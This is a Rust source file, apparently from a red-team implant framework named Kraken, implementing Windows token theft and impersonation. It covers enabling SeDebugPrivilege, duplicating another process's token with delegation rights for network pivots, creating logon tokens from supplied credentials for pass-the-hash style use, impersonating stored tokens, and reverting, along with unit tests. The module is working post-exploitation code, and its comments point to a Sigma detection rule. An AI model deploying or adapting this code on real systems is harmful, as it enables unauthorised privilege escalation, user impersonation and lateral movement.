//! Token manipulation operations
//!
//! All Win32 calls are wrapped in `tokio::task::spawn_blocking` by the public
//! async entry points so they do not block the async runtime.
//!
//! # Operations
//! * `steal_token`      – duplicate a primary token from a running process
//! * `make_token`       – synthesise a token with `LogonUserW` (no DC needed
//!                        at creation time when using NEW_CREDENTIALS logon)
//! * `impersonate`      – call `ImpersonateLoggedOnUser` from the store
//! * `rev2self`         – revert the current thread to its original token
//! * `enable_privilege` – enable a named privilege on the current process token
//!
//! Detection artefacts documented in wiki/detection/sigma/kraken_token_ops.yml

use common::KrakenError;
#[cfg(windows)]
use tracing::{debug, warn};

// ---------------------------------------------------------------------------
// Windows implementation
// ---------------------------------------------------------------------------

#[cfg(windows)]
mod win {
    use super::*;
    use crate::handle::TokenHandle;
    use crate::store;

    use windows_sys::Win32::Foundation::{
        CloseHandle, GetLastError, HANDLE, LUID,
    };
    use windows_sys::Win32::Security::{
        AdjustTokenPrivileges, DuplicateTokenEx, ImpersonateLoggedOnUser,
        LogonUserW, LookupPrivilegeValueW, RevertToSelf,
        SecurityDelegation, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES,
        TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_PRIVILEGES,
        TOKEN_QUERY, TokenPrimary, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50,
    };
    use windows_sys::Win32::System::Threading::{
        GetCurrentProcess, OpenProcess, OpenProcessToken, PROCESS_QUERY_INFORMATION,
    };

    // -----------------------------------------------------------------------
    // enable_privilege
    // -----------------------------------------------------------------------

    /// Enable a named privilege on the current process token.
    ///
    /// Commonly called with `"SeDebugPrivilege"` before `steal_token`.
    pub fn enable_privilege(name: &str) -> Result<(), KrakenError> {
        // Encode privilege name as null-terminated UTF-16.
        let name_wide: Vec<u16> = name.encode_utf16().chain(std::iter::once(0)).collect();

        unsafe {
            // Open current process token with adjust+query rights.
            let mut token: HANDLE = 0;
            let ok = OpenProcessToken(
                GetCurrentProcess(),
                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                &mut token,
            );
            if ok == 0 {
                return Err(KrakenError::Module(format!(
                    "OpenProcessToken failed: {}",
                    GetLastError()
                )));
            }
            let token = TokenHandle::new(token)
                .ok_or_else(|| KrakenError::Module("null process token".into()))?;

            // Look up the LUID for the requested privilege.
            let mut luid = LUID { LowPart: 0, HighPart: 0 };
            let ok = LookupPrivilegeValueW(std::ptr::null(), name_wide.as_ptr(), &mut luid);
            if ok == 0 {
                return Err(KrakenError::Module(format!(
                    "LookupPrivilegeValueW({name}) failed: {}",
                    GetLastError()
                )));
            }

            // Build a TOKEN_PRIVILEGES structure for a single privilege.
            let mut tp = TOKEN_PRIVILEGES {
                PrivilegeCount: 1,
                Privileges: [windows_sys::Win32::Security::LUID_AND_ATTRIBUTES {
                    Luid: luid,
                    Attributes: SE_PRIVILEGE_ENABLED,
                }],
            };

            let ok = AdjustTokenPrivileges(
                token.as_raw(),
                0, // DisableAllPrivileges = FALSE
                &mut tp,
                std::mem::size_of::<TOKEN_PRIVILEGES>() as u32,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
            );
            if ok == 0 {
                return Err(KrakenError::Module(format!(
                    "AdjustTokenPrivileges failed: {}",
                    GetLastError()
                )));
            }

            // AdjustTokenPrivileges can succeed but set ERROR_NOT_ALL_ASSIGNED.
            let last = GetLastError();
            if last != 0 {
                warn!("enable_privilege({name}): AdjustTokenPrivileges last_error={last}");
            }
        }

        debug!("enabled privilege: {name}");
        Ok(())
    }

    // -----------------------------------------------------------------------
    // steal_token
    // -----------------------------------------------------------------------

    /// Open a process by PID, duplicate its primary token with
    /// `SecurityDelegation` impersonation level, and store the result.
    ///
    /// Returns the token store ID.
    pub fn steal_token(pid: u32) -> Result<u32, KrakenError> {
        // Enable SeDebugPrivilege so we can open protected processes.
        enable_privilege("SeDebugPrivilege")?;

        unsafe {
            // Open the target process with query rights.
            let proc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);
            if proc == 0 {
                return Err(KrakenError::Module(format!(
                    "OpenProcess(pid={pid}) failed: {}",
                    GetLastError()
                )));
            }
            let proc = TokenHandle::new(proc)
                .ok_or_else(|| KrakenError::Module("null process handle".into()))?;

            // Open the process token.
            let mut src_token: HANDLE = 0;
            let ok = OpenProcessToken(proc.as_raw(), TOKEN_DUPLICATE | TOKEN_QUERY, &mut src_token);
            if ok == 0 {
                return Err(KrakenError::Module(format!(
                    "OpenProcessToken(pid={pid}) failed: {}",
                    GetLastError()
                )));
            }
            let src_token = TokenHandle::new(src_token)
                .ok_or_else(|| KrakenError::Module("null source token".into()))?;

            // Duplicate as a primary token with SecurityDelegation so the
            // token can be used for network authentication (pass-the-token /
            // network pivots).
            let mut dup_token: HANDLE = 0;
            let ok = DuplicateTokenEx(
                src_token.as_raw(),
                TOKEN_ALL_ACCESS,
                std::ptr::null(),
                SecurityDelegation,
                TokenPrimary,
                &mut dup_token,
            );
            if ok == 0 {
                return Err(KrakenError::Module(format!(
                    "DuplicateTokenEx(pid={pid}) failed: {}",
                    GetLastError()
                )));
            }

            // Store the duplicated handle (store takes ownership).
            let id = store::insert(dup_token as isize, format!("steal:{pid}"))?;
            debug!("steal_token: pid={pid} -> token_id={id}");
            Ok(id)
        }
    }

    // -----------------------------------------------------------------------
    // make_token
    // -----------------------------------------------------------------------

    /// Synthesise a token for `domain\user` using `LOGON32_LOGON_NEW_CREDENTIALS`.
    ///
    /// With NEW_CREDENTIALS the domain controller is NOT contacted at logon
    /// time; authentication is deferred until the token is actually used for
    /// a network resource, making this suitable for pass-the-hash / over-pass
    /// scenarios where you hold plaintext credentials.
    ///
    /// Returns the token store ID.
    pub fn make_token(user: &str, pass: &str, domain: &str) -> Result<u32, KrakenError> {
        let user_wide: Vec<u16> = user.encode_utf16().chain(std::iter::once(0)).collect();
        let pass_wide: Vec<u16> = pass.encode_utf16().chain(std::iter::once(0)).collect();
        let domain_wide: Vec<u16> = domain.encode_utf16().chain(std::iter::once(0)).collect();

        unsafe {
            let mut token: HANDLE = 0;
            let ok = LogonUserW(
                user_wide.as_ptr(),
                domain_wide.as_ptr(),
                pass_wide.as_ptr(),
                LOGON32_LOGON_NEW_CREDENTIALS,
                LOGON32_PROVIDER_WINNT50,
                &mut token,
            );
            if ok == 0 {
                return Err(KrakenError::Module(format!(
                    "LogonUserW({domain}\\{user}) failed: {}",
                    GetLastError()
                )));
            }

            let id = store::insert(token as isize, format!("make:{domain}\\{user}"))?;
            debug!("make_token: {domain}\\{user} -> token_id={id}");
            Ok(id)
        }
    }

    // -----------------------------------------------------------------------
    // impersonate
    // -----------------------------------------------------------------------

    /// Impersonate a stored token on the current thread.
    ///
    /// Looks up `token_id` in the store and calls `ImpersonateLoggedOnUser`.
    pub fn impersonate(token_id: u32) -> Result<(), KrakenError> {
        let stored = crate::store::get(token_id)?;
        unsafe {
            let ok = ImpersonateLoggedOnUser(stored.raw_handle as HANDLE);
            if ok == 0 {
                return Err(KrakenError::Module(format!(
                    "ImpersonateLoggedOnUser(token_id={token_id}) failed: {}",
                    GetLastError()
                )));
            }
        }
        debug!("impersonating token_id={token_id} ({})", stored.source);
        Ok(())
    }

    // -----------------------------------------------------------------------
    // rev2self
    // -----------------------------------------------------------------------

    /// Revert the current thread's impersonation token to the process token.
    pub fn rev2self() -> Result<(), KrakenError> {
        unsafe {
            let ok = RevertToSelf();
            if ok == 0 {
                return Err(KrakenError::Module(format!(
                    "RevertToSelf failed: {}",
                    GetLastError()
                )));
            }
        }
        debug!("rev2self: reverted to process token");
        Ok(())
    }
}

// ---------------------------------------------------------------------------
// Public async wrappers (all platforms compile; non-Windows returns error)
// ---------------------------------------------------------------------------

/// Enable a named privilege on the current process token.
///
/// Should be called with `"SeDebugPrivilege"` before `steal_token` when
/// targeting protected processes.
pub async fn enable_privilege(name: impl Into<String> + Send + 'static) -> Result<(), KrakenError> {
    #[cfg(windows)]
    {
        tokio::task::spawn_blocking(move || win::enable_privilege(&name.into()))
            .await
            .map_err(|e| KrakenError::Internal(e.to_string()))?
    }
    #[cfg(not(windows))]
    {
        let _ = name;
        Err(KrakenError::Module(
            "token operations only supported on Windows".into(),
        ))
    }
}

/// Duplicate a primary token from `pid` with SecurityDelegation.
///
/// Returns the token store ID.
pub async fn steal_token(pid: u32) -> Result<u32, KrakenError> {
    #[cfg(windows)]
    {
        tokio::task::spawn_blocking(move || win::steal_token(pid))
            .await
            .map_err(|e| KrakenError::Internal(e.to_string()))?
    }
    #[cfg(not(windows))]
    {
        let _ = pid;
        Err(KrakenError::Module(
            "token operations only supported on Windows".into(),
        ))
    }
}

/// Create a synthetic token for `domain\user` using LogonUserW
/// with LOGON32_LOGON_NEW_CREDENTIALS (no DC contact at creation time).
///
/// Returns the token store ID.
pub async fn make_token(
    user: impl Into<String> + Send + 'static,
    pass: impl Into<String> + Send + 'static,
    domain: impl Into<String> + Send + 'static,
) -> Result<u32, KrakenError> {
    #[cfg(windows)]
    {
        tokio::task::spawn_blocking(move || {
            win::make_token(&user.into(), &pass.into(), &domain.into())
        })
        .await
        .map_err(|e| KrakenError::Internal(e.to_string()))?
    }
    #[cfg(not(windows))]
    {
        let _ = (user, pass, domain);
        Err(KrakenError::Module(
            "token operations only supported on Windows".into(),
        ))
    }
}

/// Impersonate a stored token on the current thread.
pub async fn impersonate(token_id: u32) -> Result<(), KrakenError> {
    #[cfg(windows)]
    {
        tokio::task::spawn_blocking(move || win::impersonate(token_id))
            .await
            .map_err(|e| KrakenError::Internal(e.to_string()))?
    }
    #[cfg(not(windows))]
    {
        let _ = token_id;
        Err(KrakenError::Module(
            "token operations only supported on Windows".into(),
        ))
    }
}

/// Revert the current thread's impersonation token to the process token.
pub async fn rev2self() -> Result<(), KrakenError> {
    #[cfg(windows)]
    {
        tokio::task::spawn_blocking(win::rev2self)
            .await
            .map_err(|e| KrakenError::Internal(e.to_string()))?
    }
    #[cfg(not(windows))]
    {
        Err(KrakenError::Module(
            "token operations only supported on Windows".into(),
        ))
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    // ------------------------------------------------------------------
    // Cross-platform: non-Windows stubs must all return the platform error
    // ------------------------------------------------------------------

    #[cfg(not(windows))]
    mod non_windows_stubs {
        use super::*;

        fn rt() -> tokio::runtime::Runtime {
            tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()
                .unwrap()
        }

        #[test]
        fn steal_token_returns_platform_error() {
            let err = rt().block_on(steal_token(1)).unwrap_err();
            assert!(
                err.to_string().contains("only supported on Windows"),
                "unexpected error: {err}"
            );
        }

        #[test]
        fn make_token_returns_platform_error() {
            let err = rt()
                .block_on(make_token("user", "pass", "domain"))
                .unwrap_err();
            assert!(err.to_string().contains("only supported on Windows"));
        }

        #[test]
        fn impersonate_returns_platform_error() {
            let err = rt().block_on(impersonate(1)).unwrap_err();
            assert!(err.to_string().contains("only supported on Windows"));
        }

        #[test]
        fn rev2self_returns_platform_error() {
            let err = rt().block_on(rev2self()).unwrap_err();
            assert!(err.to_string().contains("only supported on Windows"));
        }

        #[test]
        fn enable_privilege_returns_platform_error() {
            let err = rt()
                .block_on(enable_privilege("SeDebugPrivilege"))
                .unwrap_err();
            assert!(err.to_string().contains("only supported on Windows"));
        }

        /// Verify arbitrary privilege names also return the platform error
        /// (not a panic or unknown-variant error).
        #[test]
        fn enable_privilege_unknown_name_returns_platform_error() {
            let err = rt()
                .block_on(enable_privilege("SeNonExistentPrivilege"))
                .unwrap_err();
            assert!(err.to_string().contains("only supported on Windows"));
        }

        /// impersonate with token_id = 0 must return the platform error,
        /// not attempt a store lookup.
        #[test]
        fn impersonate_zero_id_returns_platform_error() {
            let err = rt().block_on(impersonate(0)).unwrap_err();
            assert!(err.to_string().contains("only supported on Windows"));
        }

        /// steal_token with pid = 0 must return the platform error, not crash.
        #[test]
        fn steal_token_pid_zero_returns_platform_error() {
            let err = rt().block_on(steal_token(0)).unwrap_err();
            assert!(err.to_string().contains("only supported on Windows"));
        }
    }

    // ------------------------------------------------------------------
    // Mock-based tests — logic that doesn't call Win32 APIs directly
    // ------------------------------------------------------------------

    mod mock_tests {
        use crate::store;
        use common::KrakenError;

        /// Confirm that impersonate(id) first tries the token store; if the
        /// id is missing it yields NotFound (cross-platform store behaviour).
        #[cfg(not(windows))]
        #[test]
        fn impersonate_missing_id_would_yield_not_found_from_store() {
            // On non-Windows the async wrapper returns the platform error
            // before reaching the store, but the store itself should still
            // return NotFound for a missing id — verify the store independently.
            let err = store::get(0xDEAD_0001).unwrap_err();
            assert!(matches!(err, KrakenError::NotFound(_)));
        }

        /// Verify store-level round-trip that steal_token would produce:
        /// source string must start with "steal:" followed by the PID.
        #[test]
        fn steal_token_source_format_in_store() {
            let pid = 12345u32;
            let id = store::insert(0x1ACE, format!("steal:{pid}")).unwrap();
            let tok = store::get(id).unwrap();
            assert_eq!(tok.source, format!("steal:{pid}"));
            store::remove(id).unwrap();
        }

        /// Verify store-level round-trip that make_token would produce:
        /// source string must be "make:domain\user".
        #[test]
        fn make_token_source_format_in_store() {
            let id = store::insert(0x2ACE, "make:CORP\\svc").unwrap();
            let tok = store::get(id).unwrap();
            assert_eq!(tok.source, "make:CORP\\svc");
            store::remove(id).unwrap();
        }

        /// A token inserted and then removed is no longer reachable — simulates
        /// the cleanup that should happen after a session ends.
        #[test]
        fn token_cleanup_after_session() {
            let id = store::insert(0x9999, "steal:99999").unwrap();
            store::remove(id).unwrap();
            let err = store::get(id).unwrap_err();
            assert!(matches!(err, KrakenError::NotFound(_)));
        }
    }

    // ------------------------------------------------------------------
    // Windows-specific tests (only compiled/run on Windows targets)
    // ------------------------------------------------------------------

    #[cfg(windows)]
    mod windows_tests {
        use super::*;
        use crate::store;
        use windows_sys::Win32::Foundation::HANDLE;
        use windows_sys::Win32::Security::{
            DuplicateTokenEx, GetTokenInformation, SecurityImpersonation,
            TokenImpersonation, TokenUser, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE,
            TOKEN_QUERY,
        };
        use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};

        fn rt() -> tokio::runtime::Runtime {
            tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()
                .unwrap()
        }

        /// OpenProcessToken on the current process must succeed.
        #[test]
        fn open_process_token_succeeds() {
            unsafe {
                let mut token: HANDLE = 0;
                let ok = OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token);
                assert_ne!(ok, 0, "OpenProcessToken failed");
                windows_sys::Win32::Foundation::CloseHandle(token);
            }
        }

        /// DuplicateTokenEx on the current process token must succeed.
        #[test]
        fn duplicate_token_ex_succeeds() {
            unsafe {
                let mut src: HANDLE = 0;
                let ok = OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE, &mut src);
                assert_ne!(ok, 0);
                let mut dup: HANDLE = 0;
                let ok = DuplicateTokenEx(
                    src,
                    TOKEN_ALL_ACCESS,
                    std::ptr::null(),
                    SecurityImpersonation,
                    TokenImpersonation,
                    &mut dup,
                );
                assert_ne!(ok, 0, "DuplicateTokenEx failed");
                windows_sys::Win32::Foundation::CloseHandle(src);
                windows_sys::Win32::Foundation::CloseHandle(dup);
            }
        }

        /// GetTokenInformation(TokenUser) must return data for the current
        /// process token.
        #[test]
        fn get_token_information_token_user() {
            unsafe {
                let mut token: HANDLE = 0;
                let ok = OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token);
                assert_ne!(ok, 0);

                let mut needed: u32 = 0;
                // First call with null buffer to get required size.
                GetTokenInformation(token, TokenUser, std::ptr::null_mut(), 0, &mut needed);
                assert!(needed > 0, "GetTokenInformation returned zero size");

                let mut buf = vec![0u8; needed as usize];
                let ok = GetTokenInformation(
                    token,
                    TokenUser,
                    buf.as_mut_ptr() as *mut _,
                    needed,
                    &mut needed,
                );
                assert_ne!(ok, 0, "GetTokenInformation failed");
                windows_sys::Win32::Foundation::CloseHandle(token);
            }
        }

        /// ImpersonateLoggedOnUser + RevertToSelf round-trip using the
        /// current process token (impersonation of self is always permitted).
        #[test]
        fn impersonate_and_revert_to_self() {
            unsafe {
                let mut src: HANDLE = 0;
                let ok = OpenProcessToken(
                    GetCurrentProcess(),
                    TOKEN_DUPLICATE | TOKEN_QUERY,
                    &mut src,
                );
                assert_ne!(ok, 0);

                let mut imp: HANDLE = 0;
                let ok = DuplicateTokenEx(
                    src,
                    TOKEN_ALL_ACCESS,
                    std::ptr::null(),
                    SecurityImpersonation,
                    TokenImpersonation,
                    &mut imp,
                );
                assert_ne!(ok, 0);
                windows_sys::Win32::Foundation::CloseHandle(src);

                // Store the impersonation token.
                let id = store::insert(imp as isize, "test:impersonate-self").unwrap();

                // Impersonate via async wrapper.
                rt().block_on(impersonate(id)).unwrap();

                // Revert via async wrapper.
                rt().block_on(rev2self()).unwrap();

                // Cleanup store entry (handle already closed by store on removal
                // only if Windows — here we close it manually since the store
                // does not own the Win32 handle lifecycle, it stores the isize).
                let tok = store::remove(id).unwrap();
                windows_sys::Win32::Foundation::CloseHandle(tok.raw_handle as HANDLE);
            }
        }

        /// enable_privilege("SeDebugPrivilege") must succeed (or return
        /// Module error if the privilege is not held — not a crash).
        #[test]
        fn enable_se_debug_privilege() {
            let result = rt().block_on(enable_privilege("SeDebugPrivilege"));
            match result {
                Ok(()) => {} // success — running with appropriate rights
                Err(KrakenError::Module(msg)) => {
                    // Expected on low-privileged test runners.
                    assert!(
                        msg.contains("AdjustTokenPrivileges")
                            || msg.contains("LookupPrivilegeValueW")
                            || msg.contains("OpenProcessToken"),
                        "unexpected module error: {msg}"
                    );
                }
                Err(e) => panic!("unexpected error variant: {e}"),
            }
        }

        /// enable_privilege("SeImpersonatePrivilege") — commonly held by
        /// service accounts; verify the call path completes without panic.
        #[test]
        fn enable_se_impersonate_privilege() {
            let result = rt().block_on(enable_privilege("SeImpersonatePrivilege"));
            // Either Ok or a Module error; must not be Internal/panic.
            assert!(
                result.is_ok() || matches!(result, Err(KrakenError::Module(_))),
                "unexpected error: {result:?}"
            );
        }

        /// A completely bogus privilege name must return a Module error from
        /// LookupPrivilegeValueW, not a panic.
        #[test]
        fn enable_nonexistent_privilege_returns_module_error() {
            let err = rt()
                .block_on(enable_privilege("SeThisPrivilegeDoesNotExist"))
                .unwrap_err();
            assert!(
                matches!(err, KrakenError::Module(_)),
                "expected Module error, got: {err:?}"
            );
        }

        /// AdjustTokenPrivileges path: verify privilege name is looked up
        /// correctly by round-tripping through LookupPrivilegeValueW directly.
        #[test]
        fn lookup_privilege_value_se_debug() {
            use windows_sys::Win32::Foundation::LUID;
            use windows_sys::Win32::Security::LookupPrivilegeValueW;

            let name: Vec<u16> = "SeDebugPrivilege"
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();
            let mut luid = LUID { LowPart: 0, HighPart: 0 };
            let ok = unsafe { LookupPrivilegeValueW(std::ptr::null(), name.as_ptr(), &mut luid) };
            assert_ne!(ok, 0, "LookupPrivilegeValueW failed for SeDebugPrivilege");
            // SeDebugPrivilege LUID is well-known: LowPart = 20 on all Windows.
            assert_eq!(luid.LowPart, 20);
        }

        /// steal_token on an obviously invalid PID must return a Module error.
        #[test]
        fn steal_token_invalid_pid_returns_module_error() {
            // PID 0 and 0xFFFFFFFF are never valid process IDs.
            let err = rt().block_on(steal_token(0xFFFF_FFFE)).unwrap_err();
            assert!(
                matches!(err, KrakenError::Module(_)),
                "expected Module error, got: {err:?}"
            );
        }
    }
}
